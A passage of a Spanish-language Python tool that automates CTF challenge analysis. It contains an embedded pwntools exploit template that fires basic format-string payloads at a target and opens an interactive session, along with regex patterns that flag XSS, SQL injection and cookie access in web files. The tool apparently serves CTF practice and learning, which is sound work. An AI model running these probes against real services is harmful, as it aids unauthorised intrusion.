            if b"flag" in response.lower():
                print(f"[!] FLAG ENCONTRADA: {{response}}")
                return response
        except:
            continue
    
    # Técnica 3: Format string básico
    format_payloads = [b"%s", b"%x", b"%p", b"%d"]
    
    for payload in format_payloads:
        print(f"[+] Probando format string: {{payload}}")
        p.sendline(payload)
        
        try:
            response = p.recvline(timeout=2)
            if b"flag" in response.lower():
                print(f"[!] FLAG ENCONTRADA: {{response}}")
                return response
        except:
            continue
    
    print("[+] Técnicas básicas completadas, iniciando modo interactivo")
    p.interactive()

if __name__ == "__main__":
    generic_exploit()
'''
    
    def detect_language(self, file_path):
        """Detectar lenguaje de programación"""
        extension = Path(file_path).suffix.lower()
        
        lang_map = {
            '.py': 'Python',
            '.js': 'JavaScript',
            '.c': 'C',
            '.cpp': 'C++',
            '.java': 'Java',
            '.php': 'PHP',
            '.go': 'Go',
            '.rs': 'Rust'
        }
        
        return lang_map.get(extension, 'Unknown')
    
    def analyze_web_file(self, file_path):
        """Analizar archivos web"""
        print(f"🌐 Archivo web detectado: {os.path.basename(file_path)}")
        
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Buscar flags
            self.search_flags_in_text(content, file_path)
            
            # Buscar vulnerabilidades web comunes
            web_vulns = [
                r'<script[^>]*>.*?</script>',  # XSS
                r'SELECT.*FROM.*WHERE',        # SQL Injection
                r'eval\s*\(',                  # Code injection
                r'document\.cookie',           # Cookie manipulation
            ]
            
            for pattern in web_vulns:
                matches = re.findall(pattern, content, re.IGNORECASE | re.DOTALL)
                if matches:
                    print(f"[!] Posible vulnerabilidad web: {pattern}")
            
        except Exception as e:
            print(f"[-] Error analizando archivo web: {e}")
    
    def analyze_document(self, file_path):
        """Analizar documentos"""
        print(f"📄 Documento detectado: {os.path.basename(file_path)}")
        
        try:
            if file_path.endswith('.txt') or file_path.endswith('.md'):
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                self.search_flags_in_text(content, file_path)
            
        except Exception as e:
            print(f"[-] Error analizando documento: {e}")
    
    def analyze_unknown_file(self, file_path):
        """Analizar archivo de tipo desconocido"""
        print(f"❓ Archivo desconocido: {os.path.basename(file_path)}")
        
        try:
            # Intentar leer como texto
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read(1000)  # Solo primeros 1000 caracteres
            
            self.search_flags_in_text(content, file_path)
            
        except:
            # Intentar leer como binario
            try:
                with open(file_path, 'rb') as f:
                    data = f.read(1000)
                
                # Buscar patrones de flag en binario
                text_data = data.decode('utf-8', errors='ignore')
                self.search_flags_in_text(text_data, file_path)
                
            except Exception as e:
                print(f"[-] No se pudo analizar archivo desconocido: {e}")
    
    def generate_final_report(self):
        """Generar reporte final del análisis"""
        print("\n" + "="*60)
        print("📊 REPORTE FINAL DE ANÁLISIS")
        print("="*60)
        
        print(f"\n🔍 Archivos analizados: {len(self.analysis_results)}")
        print(f"🚩 Flags encontradas: {len(self.flags_found)}")
        
        if self.flags_found:
            print("\n🏆 FLAGS ENCONTRADAS:")
            for i, flag_info in enumerate(self.flags_found, 1):
                print(f"  {i}. {flag_info.get('flag', flag_info.get('content', 'N/A'))}")
                print(f"     Fuente: {os.path.basename(flag_info['source'])}")
                print(f"     Método: {flag_info['method']}")
                print()
        
        # Guardar reporte en archivo
        report_file = f"{self.working_directory}/analysis_report.json"
        report_data = {
            "timestamp": datetime.now().isoformat(),
            "files_analyzed": len(self.analysis_results),
            "flags_found": self.flags_found,
            "analysis_results": self.analysis_results
        }
        
        try:
            with open(report_file, 'w') as f:
                json.dump(report_data, f, indent=2, default=str)
            print(f"📄 Reporte guardado en: {report_file}")
        except Exception as e:
            print(f"[-] Error guardando reporte: {e}")

def main():
    """Función principal"""
    print("🤖 PWN AI ANALYZER - Análisis Automático de CTFs")
    print("="*50)
    
    if len(sys.argv) < 2:
        print("Uso: python pwn_ai_analyzer.py <directorio_o_archivo> [gemini_api_key]")
        print("\nEjemplos:")
        print("  python pwn_ai_analyzer.py ./ctf_challenge/")
        print("  python pwn_ai_analyzer.py ./binary.exe")
        print("  python pwn_ai_analyzer.py ./challenge.zip AIzaSyC...")
        return
    
    target_path = sys.argv[1]
    gemini_key = sys.argv[2] if len(sys.argv) > 2 else None
    
    # Crear analizador
    analyzer = PWNAIAnalyzer(gemini_api_key=gemini_key)
    
    # Analizar objetivo
    if os.path.isdir(target_path):
        analyzer.analyze_directory(target_path)
    elif os.path.isfile(target_path):
        analyzer.analyze_single_file(target_path)
    else:
        print(f"[-] Ruta no válida: {target_path}")
        return
    
    print("\n✅ Análisis completado!")

if __name__ == "__main__":
    main()